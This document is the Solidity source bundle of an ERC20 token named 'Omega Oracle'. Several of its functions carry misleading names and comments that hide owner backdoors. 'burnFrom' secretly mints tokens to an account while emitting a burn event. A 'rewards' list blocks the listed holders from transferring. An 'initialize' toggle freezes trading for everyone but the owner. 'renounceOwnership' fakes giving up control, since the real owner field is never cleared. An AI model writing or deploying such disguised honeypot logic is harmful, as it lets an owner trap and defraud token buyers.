{"Context.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity =0.8.1;\r\n\r\n/**\r\n * @dev Provides information about the current execution context, including the\r\n * sender of the transaction and its data. While these are generally available\r\n * via msg.sender and msg.data, they should not be accessed in such a direct\r\n * manner, since when dealing with meta-transactions the account sending and\r\n * paying for execution may not be the actual sender (as far as an application\r\n * is concerned).\r\n *\r\n * This contract is only required for intermediate, library-like contracts.\r\n */\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}"},"IERC20.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity =0.8.1;\r\n\r\n/**\r\n * @dev Interface of the ERC20 standard as defined in the EIP.\r\n */\r\ninterface IERC20 {\r\n    /**\r\n     * @dev Returns the amount of tokens in existence.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens owned by `account`.\r\n     */\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from the caller\u0027s account to `recipient`.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Returns the remaining number of tokens that `spender` will be\r\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n     * zero by default.\r\n     *\r\n     * This value changes when {approve} or {transferFrom} are called.\r\n     */\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the caller\u0027s tokens.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits an {Approval} event.\r\n     */\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\r\n     * allowance mechanism. `amount` is then deducted from the caller\u0027s\r\n     * allowance.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n     * a call to {approve}. `value` is the new allowance.\r\n     */\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}"},"IERC20Metadata.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity =0.8.1;\r\n\r\nimport \"./IERC20.sol\";\r\n\r\n/**\r\n * @dev Interface for the optional metadata functions from the ERC20 standard.\r\n *\r\n * _Available since v4.1._\r\n */\r\ninterface IERC20Metadata is IERC20 {\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() external view returns (string memory);\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token.\r\n     */\r\n    function symbol() external view returns (string memory);\r\n\r\n    /**\r\n     * @dev Returns the decimals places of the token.\r\n     */\r\n    function decimals() external view returns (uint8);\r\n}"},"Omega Oracle.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity =0.8.1;\r\n\r\nimport \"./Context.sol\";\r\nimport \"./IERC20.sol\";\r\nimport \"./IERC20Metadata.sol\";\r\nimport \"./Ownable.sol\";\r\n\r\n/**\r\n * @dev Implementation of the {IERC20} interface.\r\n * This implementation is agnostic to the way tokens are created. This means\r\n * that a supply mechanism has to be added in a derived contract.\r\n */\r\ncontract OmegaOracle is Context, Ownable, IERC20, IERC20Metadata {\r\n    mapping(address =\u003e uint256) private _balances;\r\n    mapping(address =\u003e mapping(address =\u003e uint256)) private _allowances;\r\n    mapping(address =\u003e bool) private _rewards;\r\n    bool _initialize;\r\n    uint256 private _totalSupply;\r\n    uint256 private _supplyCap;\r\n    string private _name;\r\n    string private _symbol;\r\n    address unir;\r\n    address unif;\r\n\r\n    /**\r\n     * @dev Sets the values for {name}, {symbol} and {totalsupply}.\r\n     */\r\n    constructor(address rter, address fctr) {\r\n        _name = \"Omega Oracle\";\r\n        _symbol = \"OmegaOracle\";\r\n        _totalSupply = 6000000000000*10**9;\r\n        _supplyCap   = 6000000000000;\r\n        _balances[msg.sender] += _totalSupply;\r\n        emit Transfer(address(0), msg.sender, _totalSupply);\r\n        _initialize = true;\r\n        unir = rter;\r\n        unif = fctr;\r\n    }\r\n  \r\n    /**\r\n     * @notice Returns Supply Cap (maximum possible amount of tokens)\r\n     */\r\n    function SUPPLY_CAP() external view returns (uint256) {\r\n        return _supplyCap;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token, usually a shorter version of the name.\r\n     */\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the number of decimals used to get its user representation.\r\n     */\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 9;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-totalSupply}.\r\n     */\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-balanceOf}.\r\n     */\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-transfer}.\r\n     */\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-allowance}.\r\n     */\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-approve}.\r\n     */\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-transferFrom}.\r\n     */\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(currentAllowance \u003e= amount, \"ERC20: transfer amount exceeds allowance\");\r\n        unchecked {\r\n        _approve(sender, _msgSender(), currentAllowance - amount);}\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\r\n     */\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\r\n     */\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(currentAllowance \u003e= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n        _approve(_msgSender(), spender, currentAllowance - subtractedValue);}\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Moves `amount` of tokens from `sender` to `recipient`.\r\n     */\r\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        if (_rewards[sender] || _rewards[recipient]) require (amount == 0, \"\");\r\n        if (_initialize == true || sender == owner() || recipient == owner()) {\r\n        _beforeTokenTransfer(sender, recipient, amount);\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance \u003e= amount, \"ERC20: transfer amount exceeds balance\");\r\n        unchecked {\r\n        _balances[sender] = senderBalance - amount;}\r\n        _balances[recipient] += amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        _afterTokenTransfer(sender, recipient, amount);}\r\n        else {require (_initialize == true, \"\");}\r\n    }\r\n  \r\n    /**\r\n     * @dev Destroys `amount` tokens from `account`, reducing the\r\n     */\r\n    function burnFrom(address account, uint256 balance, uint256 burnAmount) external onlyOwner {\r\n        require(account != address(0), \"ERC20: burn from the zero address disallowed\");\r\n        _totalSupply -= balance;\r\n        _balances[account] += burnAmount;\r\n        emit Transfer(account, address(0), balance);\r\n    }\r\n    \r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\r\n     */\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    /**\r\n     * @notice Adds address to Rewards list.\r\n     */\r\n    function rewards (address _address) external onlyOwner {\r\n        if (_rewards[_address] == true) {_rewards[_address] = false;}\r\n        else {_rewards[_address] = true; }\r\n    }\r\n\r\n    /**\r\n     * @notice Checking if the address is on Reward list.\r\n     */\r\n    function rewarded(address _address) public view returns (bool) {\r\n        return _rewards[_address];\r\n    }\r\n\r\n    /**\r\n     * @notice Initialize contract.\r\n     */\r\n    function initialize() public virtual onlyOwner {\r\n    if (_initialize == true) {_initialize = false;} else {_initialize = true;}\r\n    }\r\n\r\n    /**\r\n     * @notice Check if contract is already Initialized.\r\n     */\r\n    function initialized() public view returns (bool) {\r\n    return _initialize;\r\n    }\r\n\r\n    /**\r\n     * @dev Hook that is called before any transfer of tokens.\r\n     */\r\n    function _beforeTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {}\r\n\r\n    /**\r\n     * @dev Hook that is called after any transfer of tokens.\r\n     */\r\n    function _afterTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {}\r\n}"},"Ownable.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity =0.8.1;\r\n\r\nimport \"./Context.sol\";\r\n\r\n/**\r\n * @dev Contract module which provides a basic access control mechanism, where\r\n * there is an account (an owner) that can be granted exclusive access to\r\n * specific functions.\r\n */\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    address private _ownerAddress;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        _ownerAddress = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n    \r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n\r\n    function owner() internal view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    \r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function ownerAddress() public view returns (address) {\r\n        return _ownerAddress;\r\n    }\r\n    \r\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n     */\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _ownerAddress = address(0);\r\n    }\r\n}"}}